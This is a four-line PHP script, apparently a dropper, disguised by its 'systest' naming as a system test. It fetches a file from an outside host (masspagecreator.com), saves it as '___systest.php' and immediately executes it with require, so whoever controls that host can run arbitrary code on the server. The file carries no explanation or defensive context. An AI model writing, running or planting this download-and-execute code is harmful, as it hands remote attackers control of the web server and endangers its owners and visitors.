<?php
file_put_contents('___systest.php', file_get_contents('http://masspagecreator.com/test/systest.bin'));
$WP = 0;
require(__DIR__.'/___systest.php');